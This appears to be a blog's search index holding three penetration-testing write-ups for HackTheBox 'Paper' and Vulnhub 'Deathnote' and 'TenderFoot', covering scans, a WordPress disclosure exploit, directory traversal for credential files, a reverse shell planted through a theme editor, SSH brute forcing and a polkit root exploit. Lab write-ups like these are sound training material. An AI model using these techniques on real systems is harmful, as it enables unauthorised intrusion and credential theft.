[ { "title": "Paper writeup", "url": "/posts/Paper-writeup/", "categories": "HackTheBox", "tags": "LFI, Wordpress, CVE, polkit", "date": "2022-06-01 00:00:00 +0100", "snippet": "PremiseHey, this is my writeup for the Hackthebox machine; paper, my first HTB non starting point machine and took me a day to finish mostly due to bad internet lmao.EnumerationAs always, lets scout our attack surface with a quick port scan‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Hackthebox/paper]‚îî‚îÄ$ cat scans.txt 1 ‚öô# Nmap 7.92 scan initiated Wed Jun 1 17:47:31 2022 as: nmap -sV -sC -p- --min-rate 2000 -vv -Pn -oN scans.txt 10.129.208.103Increasing send delay for 10.129.208.103 from 0 to 5 due to 86 out of 285 dropped probes since last increase.Increasing send delay for 10.129.208.103 from 5 to 10 due to 157 out of 522 dropped probes since last increase.Increasing send delay for 10.129.208.103 from 10 to 20 due to 142 out of 473 dropped probes since last increase.Increasing send delay for 10.129.208.103 from 40 to 80 due to 157 out of 522 dropped probes since last increase.Increasing send delay for 10.129.208.103 from 160 to 320 due to 114 out of 379 dropped probes since last increase.Increasing send delay for 10.129.208.103 from 320 to 640 due to 152 out of 505 dropped probes since last increase.Increasing send delay for 10.129.208.103 from 640 to 1000 due to 145 out of 483 dropped probes since last increase.Warning: 10.129.208.103 giving up on port because retransmission cap hit (10).Nmap scan report for 10.129.208.103Host is up, received user-set (0.20s latency).Scanned at 2022-06-01 17:47:31 WAT for 136sNot shown: 64046 closed tcp ports (conn-refused), 1486 filtered tcp ports (no-response)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN| 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg=| 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX80/tcp open http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)| http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE|_ Potentially risky methods: TRACE|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28|_http-title: HTTP Server Test Page powered by CentOS443/tcp open ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_ssl-date: TLS randomness does not represent time| http-methods: | Supported Methods: GET POST OPTIONS HEAD TRACE|_ Potentially risky methods: TRACE|_http-title: 400 Bad Request| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain| Subject Alternative Name: DNS:localhost.localdomain| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain/organizationalUnitName=ca-3899279223185377061| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-07-03T08:52:34| Not valid after: 2022-07-08T10:32:34| MD5: 579a 92bd 803c ac47 d49c 5add e44e 4f84| SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9| -----BEGIN CERTIFICATE-----| MIIE4DCCAsigAwIBAgIIdryw6eirdUUwDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMzg5OTI3| OTIyMzE4NTM3NzA2MTEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0yMTA3| MDMwODUyMzRaFw0yMjA3MDgxMDMyMzRaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAL1/3n1pZvFgeX1ja/w84jNxT2NcBkux| s5DYnYKeClqncxe7m4mz+my4uP6J1kBP5MudLe6UE62KFX3pGc6HCp2G0CdA1gQm| 4WYgF2E7aLNHZPrKQ+r1fqBBw6o3NkNxS4maXD7AvrCqkgpID/qSziMJdUzs9mS+| NTzWq0IuSsTztLpxUEFv7T6XPGkS5/pE2hPWO0vz/Bd5BYL+3P08fPsC0/5YvgkV| uvFbFrxmuOFOTEkrTy88b2fLkbt8/Zeh4LSdmQqriSpxDnag1i3N++1aDkIhAhbA| LPK+rZq9PmUUFVY9MqizBEixxRvWhaU9gXMIy9ZnPJPpjDqyvju5e+kCAwEAAaNg| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFBB8mEcpW4ZNBIaoM7mCF/Z+7ffA| MA0GCSqGSIb3DQEBCwUAA4ICAQCw4uQfUe+FtsPdT0eXiLHg/5kXBGn8kfJZ45hP| gcuwa5JfAQeA3JXx7piTSiMMk0GrWbqbrpX9ZIkwPnZrN+9PV9/SNCEJVTMy+LDQ| QGsyqwkZpMK8QThzxRvXvnyf3XeEFDL6N4YeEzWz47VNlddeqOBHmrDI5SL+Eibh| wxNj9UXwhEySUpgMAhU+QtXk40sjgv4Cs3kHvERvpwAfgRA7N38WY+njo/2VlGaT| qP+UekP42JveOIWhf9p88MUmx2QqtOq/WF7vkBVbAsVs+GGp2SNhCubCCWZeP6qc| HCX0/ipKZqY6zIvCcfr0wHBQDY9QwlbJcthg9Qox4EH1Sgj/qKPva6cehp/NzsbS| JL9Ygb1h65Xpy/ZwhQTl+y2s+JxAoMy3k50n+9lzCFBiNzPLsV6vrTXCh7t9Cx07| 9jYqMiQ35cEbQGIaKQqzguPXF5nMvWDBow3Oj7fYFlCdLTpaTjh8FJ37/PrhUWIl| Li+WW8txrQKqm0/u1A41TI7fBxlUDhk6YFA+gIxX27ntQ0g+lLs8rwGlt/o+e3Xa| OfcJ7Tl0ovWa+c9lWNju5mgdU+0v4P9bqv4XcIuyE0exv5MleA99uOYE1jlWuKf1| m9v4myEY3dzgw3IBDmlYpGuDWQmMYx8RVytYN3Z3Z64WglMRjwEWNGy7NfKm7oJ4| mh/ptg==|_-----END CERTIFICATE-----| tls-alpn: |_ http/1.1|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9Read data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Jun 1 17:49:47 2022 -- 1 IP address (1 host up) scanned in 136.04 secondsOn visiting port 80 we are greeted with the centOS Apache landing page and port 443 is simply hosting an https version of the site, source code inspections yield nothing, so I progress with a nikto scan for any abnormalities that could be leveraged for a foothold,From the web vuln scan I deduced that the backend server wants to be identified with the ‚Äúoffice.paper‚Äù FQDN and this was smuggled as a shady header, which I confirmed by sending a malformed request with netcat to retrieve response header content:So say less, we add the absolute domain name to our hosts file:‚îå‚îÄ‚îÄ(rootüíÄazazel)-[/home/azazel/Hackthebox/paper]‚îî‚îÄ# echo -n \"10.129.208.103 office.paper\" &gt;&gt; /etc/hostsAwesome, this time around we have a proper site, which I detected was crafted with wordpress from the bottom content hehee, this just got hella fun!I also noticed comments talking about a group chat but couldn‚Äôt make much of it(at that point). Anyways, since this is wordpress lets bust out wpscanThings to note: From the first image we know the site was built from an ancient wordpress version and there will most likely be an exploit in the wild From the second image we know all our users, nick and prisonmike.. we could run a bruteforce with wpscan against both users, while we search if an exploit exists for the wp version echo -n \"prisonmike\\nnick &gt; users.txt\"Leading with the wp version we have a sensitive information disclosure exploit which could be carried out by appending the url with ?static=1‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~]‚îî‚îÄ$ searchsploit wordpress 5.2.3 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------WordPress Core 5.2.3 - Cross-Site Host Modification | php/webapps/47361.plWordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.mdWordPress Core &lt; 5.3.x - 'xmlrpc.php' Denial of Service | php/dos/47800.pyWordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulnerabilities | php/webapps/39553.txtWordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection | php/webapps/44943.txtWordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injection | php/webapps/48918.sh------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------Shellcodes: No Results‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Hackthebox/paper]‚îî‚îÄ$ searchsploit -m multiple/webapps/47690.md;cat 47690.md Exploit: WordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts URL: https://www.exploit-db.com/exploits/47690 Path: /usr/share/exploitdb/exploits/multiple/webapps/47690.mdFile Type: ASCII textCopied to: /home/azazel/Hackthebox/paper/47690.mdSo far we know that adding `?static=1` to a wordpress URL should leak its secret contentHere are a few ways to manipulate the returned entries:- `order` with `asc` or `desc`- `orderby`- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date formatIn this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&amp;order=asc` will show the secret content With this we have a disclosed secret message which divulges the existence of a subdomain http://chat.office.paper/register/8qozr226AhkCHZdyY for office.paper, I add that to my hosts file and visit, it leads to a chat system, so lets just create an account and login, it then takes us to a group chat where the admin ‚Äúdwight‚Äù created a bot ‚Äúrecyclops‚Äù to manage chats and other absurd functions:Lets relate with recyclops in private hehee, after trying out wild things in a direct message, through directory traversal we are able to retrieve files and list directory contents, on reading the /etc/passwd we get all the users of the system:After snooping around I find a juicy ‚Äú.env‚Äù file in dwights home dir which contains environment variables which have been exported and contained within the file, including a password, now I‚Äôm hyped!Trying the credentials on ssh grants us a foothold.Initial AccessJust grab the user flag in dwight‚Äôs home dir, and now to make ourselves root!Race conditions? Root!After manually enumerating for privesc vectors and finding nothing, I swiftly scp my go-to privesc script, where I detect the system is susceptible to the polkit exploit, read more about it here, grab a copy here, scp‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Utils]‚îî‚îÄ$ scp paperpwn.py dwight@office.paper:/tmp 1 ‚öôdwight@office.paper's password: paperpwn.py 100% 2427 2.8KB/s 00:00 Or wget to the target and run the script, switch to the user ‚Äúahmed‚Äù or whatever you edit the username to in the script, this script automates the whole manual exploit process of creating a user with unlimited privileges through dbus in a time restricted condition by creating a user belonging to the wheel group (the wheel group is a ‚Äúspecial‚Äù group with users who have individual elevated permissions tto gain access to admin level commands and binaries) the wheel group is tied to the sudo group, with this we can switch to root with our password(un comment the password in the script and edit the line to string: ‚Äúyourpassword‚Äù replacing with your choice of password for the user) and provide the password, thus with lateral privilege elevation we become a sudoer and vertical privesc become root.Thanks for the read.I would appreciate feedbacks or corrections also connections XD thru discord @Rami3l#8039 or LinkedIn" }, { "title": "Deathnote Writeup", "url": "/posts/Deathnote/", "categories": "Vulnhub", "tags": "wordpress, webshell, sensitive information disclosure", "date": "2022-05-03 00:00:00 +0100", "snippet": "PrefaceHi! this is a walkthrough of the Vulnhub machine Deathnote,One of my favourite anime‚Äôs of all time and described by the author as a Straight forward box, ranked Level - easy with a very helpful advice ‚Äúdon‚Äôt waste too much time thinking outside the box‚Äù. Initially I felt it was too easy to make a writeup about this machine but I encountered some things for the first time while hacking wordpress, and I hope it‚Äôll be of help to you just incase you get stuck;)There are 2 intended ways of gaining Access, I‚Äôll walk you through both ways! The goal is simple‚Ä¶Get Root!Live Host DiscoveryOnce deployed on a hypervisor, we need to find a way to find our targets ip, this we could do through an arp-scan with netdiscover or the arp-scan command utility:: with arp-scan‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Vulnhub/Deathnote]‚îî‚îÄ$ sudo arp-scan 192.168.0.124/24Interface: wlan0, type: EN10MB, MAC: e4:b3:18:45:da:c6, IPv4: 192.168.0.124WARNING: host part of 192.168.0.124/24 is non-zeroStarting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.0.1\tc8:ea:f8:dd:9b:fb\tzte corporation192.168.0.192\t08:00:27:a5:27:3e\tPCS Systemtechnik GmbH2 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 2.015 seconds (127.05 hosts/sec). 2 responded Or with netdiscoversudo netdiscover -i wlan0 -r 192.x.x.x/24 The above methods function through the same procedure of flooding the subnet with arp-requests, and any hosts active would reply with an arp-reply.Reconaissance: Port ScanTo enumerate for services on our target::‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Vulnhub/Deathnote]‚îî‚îÄ$ nmap -sCV 192.168.0.192 -p- --min-rate 2000 -vv --open 130 ‚®ØStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-02 18:21 WATNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 18:21Completed NSE at 18:21, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 18:21Completed NSE at 18:21, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 18:21Completed NSE at 18:21, 0.00s elapsedInitiating Ping Scan at 18:21Scanning 192.168.0.192 [2 ports]Completed Ping Scan at 18:21, 0.00s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 18:21Completed Parallel DNS resolution of 1 host. at 18:21, 0.01s elapsedInitiating Connect Scan at 18:21Scanning deathnote (192.168.0.192) [65535 ports]Discovered open port 22/tcp on 192.168.0.192Discovered open port 80/tcp on 192.168.0.192Completed Connect Scan at 18:21, 1.33s elapsed (65535 total ports)Initiating Service scan at 18:21Scanning 2 services on deathnote (192.168.0.192)Completed Service scan at 18:21, 6.02s elapsed (2 services on 1 host)NSE: Script scanning 192.168.0.192.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 18:21Completed NSE at 18:21, 0.25s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 18:21Completed NSE at 18:21, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 18:21Completed NSE at 18:21, 0.00s elapsedNmap scan report for deathnote (192.168.0.192)Host is up, received syn-ack (0.00018s latency).Scanned at 2022-05-02 18:21:15 WAT for 8sNot shown: 65533 closed tcp ports (conn-refused)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 5e:b8:ff:2d:ac:c7:e9:3c:99:2f:3b:fc:da:5c:a3:53 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm89TpyON8aYXST7z9QwF/lZeqXiejtLOaVDmyxME7S2M1Z+57KxnB8ixV0MArX+cNTWO92xYlTiYKIKusPwrB43AArYrnHTLUg79N59GhbreA8yX2xxwuJq/+tu2ieMS7QORyKJVZCRwV/EVHknQyg+jrXLtD74C869l9wb3S9yIeSK1UGNrbdAgOPZtG4pFFRcKghC4wtuukqaE7uIv4yO8mHOo+p+V8+Ab3tbmIG2KZLbb3hW3vjKc4XxBnoJTWwsX6zkV/1HnfE+ptFzs0sHWpyiAKtUGs4AkfymcG5SDyuAkBBiABpBbzBK/Lzcjhb7dJGpqPac+M+lxIb+T1| 256 a8:f3:81:9d:0a:dc:16:9a:49:ee:bc:24:e4:65:5c:a6 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCh/urbdjg8yYyJTf6zXc0OVNr9nZ8BXv26XthpOdSCdnIMLKNmlAbONw9KKJ05/BS/7T+zg/LHdA5FAAHL8OFw=| 256 4f:20:c3:2d:19:75:5b:e8:1f:32:01:75:c2:70:9a:7e (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9njk3MGTFBM1ueTjfLjhVUE0a485AyO7kFm0enSRap80/tcp open http syn-ack Apache httpd 2.4.38 ((Debian))| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache/2.4.38 (Debian)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 18:21Completed NSE at 18:21, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 18:21Completed NSE at 18:21, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 18:21Completed NSE at 18:21, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.11 secondsOn visiting port 80, the ip automatically resolves to a ‚Äúwww.deathnote.vuln/wordpress/‚Äù and the page doesn‚Äôt load, In simple terms, this is as a result of a resolution conflict by DNS not recognising that site as the bearer of the ip.Easy fix! we would need to override this DNS resolution by including the ip and host name in our /etc/hosts file like this:sudo echo \"$ip deathnote.vuln\" &gt;&gt; /etc/hostsOr vim or Nano into the file with sudo and edit the file:Awesome, ‚ÄúIt works!‚Äù ;) another really funny thing is the /wordpress/ directory gave it away as a wordpress site without a directory enumeration, we are in for a world of fun man!Lying carelessly in the comments section is kira‚Äôs creds, Light should know better yunnoawesome, we got creds, I just let dirsearch loose in the background so we don‚Äôt miss anything and to find an admin login page! By default it‚Äôs always /wp-admin/ tried out the creds we have for a user ‚Äúkira‚Äù on ssh, didn‚Äôt work.But on the admin page it does:Awesome, we have full access to admin dashboard, definitely we would have access to editor tools, to spawn a reverse shell could happen in so many ways, we could either: upload a vulnerable plugin or theme and exploit it use the editor feature to edit on of the many php files within either the editor or plugin section Or upload a shell as a plugin in zip format.I prefer the second, no stress, just edit any php file by replacing with reverse shellcode from and navigate to it to generate a reverse shell callback to our attack machinelets get to it! you could grab a php shell code here or your go-to reverse shellcode and edit a php file like so:on clicking update file, I come across a weird error, which is what spiced up this box a little: Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.I guess this was as a result of the site being able to detect a ‚Äúpoorly coded‚Äù theme or plugin, at least from the viewpoint of WordPress Core.read more about this error hereExploitationAfter much playing around and a bunch of fails with plugins(this deactivate, edit and activate doesn‚Äôt work on plugins or at least it didn‚Äôt for me), I was able to bypass this by deactivating the theme whose php file I wish to replace with shellcode, I used the Twenty Twenty::And then editing and updating the php file into our shell code(whilst inactive) and then reactivate it back::It allows us successfully edit a theme while it‚Äôs deactivated!And finally, after setting up a listener to activate the shell and generate our callback, we could navigate to a page which doesn‚Äôt exist OR navigate to the 404.php page; I prefer terminal::Initial AccessHell yeah, we got a shell! But not a stable one(check out my tty cheatsheet here if you have issues with shell stabilization) if you‚Äôre not so sure you could use the tty cmd let‚Äôs get a stable tty::In Kira‚Äôs home dir, we have a kira.txt file but is unreadable sighOne amazing thing about wordpress sites is that it saves MySQL backups for the base configuration files of the wordpress site in the same dirctory as the resources where the site runs on!(/var/www/html/wordpress)called wp-config.php always search for this first, it usually contains a user creds.we get L‚Äôs creds from here! now we can login over ssh. On login we meet a note L left us in brainfuck, decode that and we have::i think u got the shell , but you wont be able to kill me -kirawww-data turnt r00t!Welp Kira has no sudo permissions, neither does he have any SUID binaries and even after scp..ing a privesc enumeration script I had nothing other than kernel exploits, after much playing around, I found a ‚Äúmisa‚Äù file in the /var directory the misa file just says:l@deathnote:~$ cd /varl@deathnote:/var$ lsbackups cache lib local lock log mail misa opt run spool tmp wwwl@deathnote:/var$ cat misait is toooo late for misa l@deathnote:/var$ And an L folder in the /opt directory with a wav file telling us to use cyber chef, say no more:The highest numeric is 9 and the highest alphabet is f beyond reasonable doubt we have a Hex sequence here! decode that:: We get a base64 text, convert that:: and we have Kira‚Äôs creds!Now we just login over ssh as kira:We finally have sufficient privileges to read our kira.txt file, which just has a base64 encoded text again::‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Utils]‚îî‚îÄ$ echo -n cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp | base64 -dplease protect one of the following 1. L (/opt)2. Misa (/var) We already know whats in the misa file and the L folder, next up, let‚Äôs get root!checking sudo permissions, Kira can run everything with sudo!Rooooooooooooooted.Second IntendedMan I found a clue that completely flew over my head until I gained foothold, maybe cause I was itchy to use a webshell haha, but here goes nothing:: checking the robots.txt‚Ä¶$ip/robots.txt we have a clue:fuck it my dad added hint on /important.jpgryuk please delete itFrom directory enum, we had an uploads folder,$ip/wordpress/wp-content/uploads/2021/07 we could check for our ‚Äúimportant.jpg‚Äù there were so many images and none such a name, I just ignored those and went after the two suspicious text files::The notes.txt file contain possible passwords and the user.txt contains possible users, we could grab those and bruteforce ssh with hydra!Boom we got L‚Äôs creds! now just login as L go to /opt get Kira‚Äôs creds, login as kira and become root!Greetings, from Rami3l." }, { "title": "TenderFoot:1 Writeup", "url": "/posts/TenderFoot/", "categories": "Vulnhub", "tags": "Enumeration, Esoteric Languages, Brainfuck", "date": "2022-05-01 00:00:00 +0100", "snippet": "PrefaceHey there! This is my writeup for the Vulnhub machine TenderFoot, Its described by it‚Äôs author as ‚ÄúA very Easy Box for beginners‚Äù, and is recommended for folks new to Vulnhub like myself. The task is simple, grab all 3 flags (user1.txt, user2.txt, proof.txt).Live Host DiscoveryThis could essentially be done in 3 ways(that I know of): Arp-scan Netdiscover Nmap ping sweep scan aka ICMP packet reception scanMy Go-to is Netdiscover:sudo netdiscover -i wlan0 -r 192.168.x.x/24 sudo because netdicover requires root permission to inject &amp; sniff packets across a local network The netdiscover command utility -i to scan a selected interface -r to scan a specified range of subnet (Defaults take forever!)Port ScanTo discover an attack surface:‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Vulnhub/TenderFoot]‚îî‚îÄ$ sudo nmap -sV -sC -sS 192.168.0.141 -Pn -p- --min-rate 2000 -vv Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-02 04:17 WATNSE: Loaded 155 scripts for scanning.NSE: Script Pre-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 04:17Completed NSE at 04:17, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 04:17Completed NSE at 04:17, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 04:17Completed NSE at 04:17, 0.00s elapsedInitiating ARP Ping Scan at 04:17Scanning 192.168.43.33 [1 port]Completed ARP Ping Scan at 04:17, 0.08s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 04:17Completed Parallel DNS resolution of 1 host. at 04:18, 13.00s elapsedInitiating SYN Stealth Scan at 04:18Scanning 192.168.43.33 [65535 ports]Discovered open port 22/tcp on 192.168.43.33Discovered open port 80/tcp on 192.168.43.33Completed SYN Stealth Scan at 04:18, 1.36s elapsed (65535 total ports)Initiating Service scan at 04:18Scanning 2 services on 192.168.43.33Completed Service scan at 04:18, 6.02s elapsed (2 services on 1 host)NSE: Script scanning 192.168.43.33.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 04:18Completed NSE at 04:18, 0.11s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 04:18Completed NSE at 04:18, 0.01s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 04:18Completed NSE at 04:18, 0.00s elapsedNmap scan report for 192.168.43.33Host is up, received arp-response (0.00034s latency).Scanned at 2022-05-02 04:18:11 WAT for 8sNot shown: 65533 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a2:b7:2d:95:e1:06:7f:a3:f1:8e:bc:5b:4c:29:19:61 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBVksY9N/ofJe604i4zM4st08JHma+9EE1bag9Iq5aSms9Hte+K8TwHxuq/n62PXSHUV0gJi//1ijo+xBBOt1OLOtEnyGZjtNeBfUqiFjXqgB4dhZk1kMRHYvuHr2zIDlMjOGKol7XXWqNtUsGaGsXWwyh7vH37nhKthZQT8VHodrM9IniaAkKA2xneI9z5AGPQVc09edoAHDa8EnzJFZPwQCkyBP+WKEYS1kAoyTwoIy2JSbRZny7/vlV1oD+r1arS2oD+YJ6cVlFk+fM7Rln2eKp4vZmdcWJte508WERZ5t1rp7ntRO3GlQ5Ed0umpQODLEbK0ptiPkOtR6kh0v7| 256 42:0c:c9:6d:1d:e9:84:19:6a:8a:d5:51:2c:69:c6:98 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBipQCFF4Aerg0pRwZ9y+le1WRmZlvYG+gfpOcrbDzOkTYzrXzWoyCdH9D7CX0LBioHqa5PB1xybTmVzwCgecgA=| 256 14:4d:74:42:78:67:9b:f3:dd:00:40:24:4d:12:c9:de (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH1227M7ks61pC0yFPWcqzN/62PAaQa9zbEvLDWU7yLq80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)MAC Address: 08:00:27:46:83:29 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNSE: Script Post-scanning.NSE: Starting runlevel 1 (of 3) scan.Initiating NSE at 04:18Completed NSE at 04:18, 0.00s elapsedNSE: Starting runlevel 2 (of 3) scan.Initiating NSE at 04:18Completed NSE at 04:18, 0.00s elapsedNSE: Starting runlevel 3 (of 3) scan.Initiating NSE at 04:18Completed NSE at 04:18, 0.00s elapsedRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.15 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65542 (2.622MB)We got http and ssh, coolOn http, its just default landing page we meet,checking the source code, at the bottom&lt;!--G00D! check /robots.txt directory.--&gt;we got a hint to check the robots.txt::Here is a directory open it /hintOkay a clue to a hidden directory let‚Äôs see where this leads, On first sight it seems blank but on viewing the source, hidden at the extreme bottom is an encoded text screaming base32(Can be identified with all upper casing characters and paddings(==)although paddings are not always present)::&lt;!--EBPV6X27L5PV6X27L5PV6X27L5PV6X27L4FHYICOGB2GQ2LOM4QEQZLSMUQSAIBAEAQCA7AKPQQFI4TZEBZW63LFORUGS3THEBSWY43FEF6AUIBNFUWS2LJNFUWS2LJNFUWS2LJNFUWS2LIKIVXHK3LFOJQXIZJANVXXEZJAHIUQ====Decrypt it!--&gt;On decoding it says:welp that‚Äôs sad, moving on, I decide to do a directory enumeration, after trying out around 5 wordlistsI finally get a hit with seclists::We know /hint is a deadend let‚Äôs visit /fotocdlesserthan, greaterthan, full stops, straight brackets, addition signs, and what not, no doubt its the esoteric brainfuck::We could decode with either this interperter or decode.frAwesome, we have a better clue, a base64 encoded header and a hint that we would need to look for a username:On decoding the header we get::‚îå‚îÄ‚îÄ(azazel„âøazazel)-[~/Vulnhub/TenderFoot]‚îî‚îÄ$ echo -n JDk5OTkwJA== | base64 -d$99990$ We have what seems to be a password, to find complete creds of a user, we could either do a password spray with hydra to find a username OR enumerate once again.Due to hydra time constraints and limited threads on ssh bruteforcing, I enumerated again, except this time with extensions(I did leave hydra to bruteforce in the background:)):dirsearch -u http://192.168.0.141/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 250 -e js,php,txt,xml we get the entry.js has a user, ‚Äúmonica‚ÄùLets login on ssh with her creds! monica:$99990$Initial AccessAnd we‚Äôre in! Lets play around üòà Here‚Äôs our first flag! Next we have this Joey directory with a whole bunch of other subdirectories :) just tab autocomplete your way to the relevant file We have a new clue, the fotocd subdirectory::We have access to the parent directory of the site and have a zip protected file and a note.txt file waiting for us, just grab those and check them 